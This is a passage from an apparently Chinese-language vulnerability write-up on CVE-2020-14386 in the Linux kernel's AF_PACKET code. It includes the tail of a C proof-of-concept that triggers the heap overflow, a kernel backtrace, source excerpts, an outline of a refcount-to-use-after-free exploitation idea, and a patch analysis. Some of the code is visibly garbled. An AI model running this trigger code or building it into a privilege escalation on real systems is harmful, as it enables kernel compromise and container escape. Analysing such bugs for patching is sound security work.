        if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
            perror("[-] write_file(/proc/self/gid_map)");
            exit(EXIT_FAILURE);
        }
    }
    void prep() {
        cpu_set_t my_set;
        CPU_ZERO(&my_set);
        CPU_SET(0, &my_set);
        if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
            perror("[-] sched_setaffinity()");
            exit(EXIT_FAILURE);
        }
    }
    void packet_socket_send(int s, char *buffer, int size) {
        struct sockaddr_ll sa;
        memset(&sa, 0, sizeof(sa));
        sa.sll_ifindex = if_nametoindex("lo");
        sa.sll_halen = ETH_ALEN;
        if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
                sizeof(sa))  1 && strcmp (argv[1], "skip-unshare") == 0)
          skip_unshare = 1;
        else if (stat ("/run/secrets/kubernetes.io", &stbuf) == 0)
          skip_unshare = 1;
        if (!skip_unshare)
          setup_unshare();
            prep();
        packet_socket_setup(0x800000, 0x11000, 2);
        uint32_t size = 0x80000/8;
        char* buf = malloc(size);
        if(!buf)
        {
            perror("malloc\n");
            exit(EXIT_FAILURE);
        }
        memset(buf,0xce,size);
        loopback_send(buf,size);
        return 0;
    }
栈回溯：
    #0  memset_erms () at arch/x86/lib/memset_64.S:66
    #1  0xffffffff831934a6 in virtio_net_hdr_from_skb
    (little_endian=, has_data_valid=,
        vlan_hlen=, hdr=, skb=) at ./include/linux/virtio_net.h:134
    #2  tpacket_rcv (skb=0xffff8881ef539940, dev=0xffff8881de534000,
    pt=, orig_dev=)
            at net/packet/af_packet.c:2287
    #3  0xffffffff82c52e47 in dev_queue_xmit_nit (skb=0xffff8881ef5391c0,
    dev=) at net/core/dev.c:2276
    #4  0xffffffff82c5e3d4 in xmit_one (more=,
    txq=, dev=,
                skb=) at net/core/dev.c:3473
    #5  dev_hard_start_xmit (first=0xffffc900001c0ff6, dev=0x0
    , txq=0xa ,
        ret=) at net/core/dev.c:3493
    #6  0xffffffff82c5fc7e in __dev_queue_xmit (skb=0xffff8881ef5391c0,
    sb_dev=) at net/core/dev.c:4052
    #7  0xffffffff831982d3 in packet_snd (len=65536, msg=,
    sock=) 0001-net-packet-fix-overflow-in-tpacket_rcv
    at net/packet/af_packet.c:2979
    #8  packet_sendmsg (sock=, msg=,
    len=65536) at net/packet/af_packet.c:3004
    #9  0xffffffff82be09ed in sock_sendmsg_nosec (msg=,
    sock=) at net/socket.c:652
    #10 sock_sendmsg (sock=0xffff8881e8ff56c0, msg=0xffff8881de56fd88) at
    net/socket.c:672
## 漏洞利用
该漏洞和 CVE-2017-7308 Linux Kernel packet_set_ring
整数符号错误漏洞类似，不过CVE-2017-7308是向后溢出。
利用尝试：
想要参考 CVE-2017-7308
布置堆的布局进行利用，但是packet_set_ring函数中进行了检查，为了触发漏洞，我们构造的po->tp_reserve
为0xffb4，这就造成下面【1】处最小frame的大小min_frame_size
为0xffe8，所以block的大小至少要为0x10000，这样就不能控制填充什么结构在block旁边。（这样大小的堆块不知道是通过什么vmalloc-xxx分配得到，vmalloc-xxx可以对应什么结构不清楚？）
    static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
            int closing, int tx_ring)
    {
            ……
        if (req->tp_block_nr) {
            unsigned int min_frame_size;
            /* Sanity tests and some calculations */
            err = -EBUSY;
            if (unlikely(rb->pg_vec))
                goto out;
            switch (po->tp_version) {
            case TPACKET_V1:
                po->tp_hdrlen = TPACKET_HDRLEN;
                break;
            case TPACKET_V2:
                po->tp_hdrlen = TPACKET2_HDRLEN;
                break;
            case TPACKET_V3:
                po->tp_hdrlen = TPACKET3_HDRLEN;
                break;
            }
            err = -EINVAL;
            if (unlikely((int)req->tp_block_size tp_block_size)))
                goto out;
            min_frame_size = po->tp_hdrlen + po->tp_reserve; // tp_version >= TPACKET_V3 &&
                req->tp_block_size req3.tp_sizeof_priv) + min_frame_size)
                goto out;
            if (unlikely(req->tp_frame_size tp_frame_size & (TPACKET_ALIGNMENT - 1)))
                goto out;
            rb->frames_per_block = req->tp_block_size / req->tp_frame_size;
            if (unlikely(rb->frames_per_block == 0))      // frames_per_block > UINT_MAX / req->tp_block_nr))
                goto out;
            if (unlikely((rb->frames_per_block * req->tp_block_nr) !=
                        req->tp_frame_nr))
                goto out;
            //分配环形缓冲区的内存块空间：
            err = -ENOMEM;
            order = get_order(req->tp_block_size);
            pg_vec = alloc_pg_vec(req, order);
packet_sock对象通过slab分配器使用kmalloc()函数进行分配。slab分配器主要用于分配比单内存页还小的那些对象
h.raw 的获得：
    tpacket_rcv：
        -> h.raw = packet_current_rx_frame(po, skb,TP_STATUS_KERNEL, (macoff+snaplen));
            ->case TPACKET_V2:
                   curr = packet_lookup_frame(po, &po->rx_ring, po->rx_ring.head, status);
    static void *packet_lookup_frame(struct packet_sock *po,
            struct packet_ring_buffer *rb,
            unsigned int position,
            int status)
    {
        unsigned int pg_vec_pos, frame_offset;
        union tpacket_uhdr h;
        pg_vec_pos = position / rb->frames_per_block;
        frame_offset = position % rb->frames_per_block;
        h.raw = rb->pg_vec[pg_vec_pos].buffer +
            (frame_offset * rb->frame_size);
        if (status != __packet_get_status(po, h.raw))
            return NULL;
        return h.raw;
    }
该漏洞只能向前越界写1~10个字节，并且block只能分配大于0x10000，目前来看利用是很难的
作者利用思路：
    struct sctp_shared_key {
        struct list_head key_list;
        struct sctp_auth_bytes *key;
        refcount_t refcnt;
        __u16 key_id;
        __u8 deactivated;
    };
作者提供的漏洞利用思路是在ring
buffer前放置一个包含refcount的结构，上溢减小refcount的值，因为packet_socket_send中的memset会赋零。refcount减少，该对象会被认为被释放了，转化成UAF漏洞。
目前找到的是sctp_shared_key这个结构，占32个字节大小，通过kmalloc-32分配，因为一页的大小为4k，4k%32=0，而ring
buffer分配是页对齐的，所以将sctp_shared_key 分配在页的最后。
由于结构对齐的缘故，key_id和deactivated字段各占4个字节，所以利用漏洞最多上溢refcnt 1~2个字节
另外笔者认为作者说溢出refcnt最高位两个字节是不是搞错了，还是说大端存放？那么图片中应该是refcount=10001b就说的通了。
总结：
本篇文章分析了CVE-2020-14386：Linux内核AF_PACKET权限提升漏洞的成因，对作者的漏洞利用思路进行了解读，但未实现漏洞利用，希望抛砖引玉，有大佬能实现漏洞利用，或者分享一下思路。
## 补丁分析
补丁将netoff 类型设置成unsigned int，赋值左右两边类型相同，不会造成整数溢出。并且检查了netoff要小于USHRT_MAX。
## 参考链接
docker：
作者的漏洞分析：
补丁：
packet_mmap：